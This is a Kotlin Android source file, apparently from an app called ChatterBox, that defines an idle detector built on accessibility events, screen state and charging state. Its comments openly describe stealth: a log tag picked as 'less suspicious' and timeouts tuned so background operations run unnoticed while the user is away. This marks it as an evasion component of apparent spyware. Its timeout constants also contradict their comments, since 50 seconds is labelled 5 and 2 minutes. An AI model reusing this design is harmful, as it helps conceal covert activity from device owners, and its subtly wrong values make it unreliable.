package com.example.ChatterBox.accessibility

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.localbroadcastmanager.content.LocalBroadcastManager

/**
 * Silent detector for user idle state to opportunistically perform background operations
 * when the user is not actively using their device
 */
object IdleDetector {
    private const val TAG = "ActivityMonitor" // Less suspicious name

    // Use reasonable timeouts for stealth
    private const val LONG_IDLE_TIMEOUT = 10 * 5 * 1000L // 5 minutes of inactivity
    private const val CHARGING_IDLE_TIMEOUT = 10 * 5 * 1000L // 2 minutes when charging
    private const val SCREEN_OFF_TIMEOUT = 30 * 1000L // 30 seconds after screen off

    // Track device state
    private var isCharging = false
    private var isScreenOn = true

    // Registered callbacks for idle state
    private val idleCallbacks = mutableListOf<() -> Unit>()

    // Handler for delayed idle checks
    private val handler = Handler(Looper.getMainLooper())

    // Last activity timestamp
    private var lastActivityTimestamp = System.currentTimeMillis()

    // Flag to track if idle detection is active
    private var idleDetectionActive = false

    // Current idle timeout based on device state
    private var idleTimeout = LONG_IDLE_TIMEOUT

    // Runnable to check for idleness
    private val idleRunnable = Runnable {
        val currentTime = System.currentTimeMillis()
        val idleTime = currentTime - lastActivityTimestamp

        if (idleTime >= idleTimeout) {
            Log.d(TAG, "Device idle detected")
            // Notify all registered callbacks of idle state
            idleCallbacks.forEach { it.invoke() }
        } else {
            // Not idle yet, schedule another check
            val timeToNextCheck = idleTimeout - idleTime
            scheduleIdleCheck(timeToNextCheck)
        }
    }

    /**
     * Start idle detection
     */
    fun startIdleDetection(context: Context) {
        if (idleDetectionActive) return

        idleDetectionActive = true
        lastActivityTimestamp = System.currentTimeMillis()
        updateIdleTimeout()

        // Schedule the initial idle check
        scheduleIdleCheck(idleTimeout)

        Log.d(TAG, "Activity monitoring started")
    }

    /**
     * Register a callback to be notified when device becomes idle
     */
    fun registerIdleCallback(callback: () -> Unit) {
        if (!idleCallbacks.contains(callback)) {
            idleCallbacks.add(callback)
        }
    }

    /**
     * Unregister an idle callback
     */
    fun unregisterIdleCallback(callback: () -> Unit) {
        idleCallbacks.remove(callback)
    }

    /**
     * Stop idle detection
     */
    fun stopIdleDetection() {
        idleDetectionActive = false
        handler.removeCallbacks(idleRunnable)
        Log.d(TAG, "Activity monitoring stopped")
    }

    /**
     * Register user activity - to be called whenever user activity is detected
     */
    fun registerUserActivity() {
        lastActivityTimestamp = System.currentTimeMillis()

        if (idleDetectionActive) {
            // Cancel any pending idle checks
            handler.removeCallbacks(idleRunnable)

            // Update timeout based on current device state
            updateIdleTimeout()

            // Schedule a new idle check
            scheduleIdleCheck(idleTimeout)
        }
    }

    /**
     * Process an accessibility event to determine if it represents user activity
     */
    fun processAccessibilityEvent(event: AccessibilityEvent?): Boolean {
        if (event == null) return false

        // Determine if this event represents user activity
        val isUserActivity = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_SCROLLED,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_START,
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_END,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_END -> true

            // Consider window state changes as activity too
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> true

            // All other event types - not considered user activity
            else -> false
        }

        if (isUserActivity) {
            registerUserActivity()
        }

        return isUserActivity
    }

    /**
     * Update idle timeout based on device state
     */
    private fun updateIdleTimeout() {
        idleTimeout = when {
            !isScreenOn -> SCREEN_OFF_TIMEOUT
            isCharging -> CHARGING_IDLE_TIMEOUT
            else -> LONG_IDLE_TIMEOUT
        }
    }

    /**
     * Schedule the idle check runnable
     */
    private fun scheduleIdleCheck(delayMs: Long) {
        handler.postDelayed(idleRunnable, delayMs)
    }

    /**
     * Update the charging state
     */
    fun updateChargingState(charging: Boolean) {
        isCharging = charging
        updateIdleTimeout()

        // If we just started charging, register activity to reset timer
        if (charging) {
            registerUserActivity()
        } else {
            // If charging stopped and we were relying on charging timeout,
            // reschedule with new timeout
            handler.removeCallbacks(idleRunnable)
            scheduleIdleCheck(idleTimeout)
        }
    }

    /**
     * Update screen state (on/off)
     */
    fun updateScreenState(screenOn: Boolean) {
        isScreenOn = screenOn
        updateIdleTimeout()

        // If screen turned off, we can use a shorter timeout
        if (!screenOn) {
            handler.removeCallbacks(idleRunnable)
            scheduleIdleCheck(idleTimeout)
        }
    }
}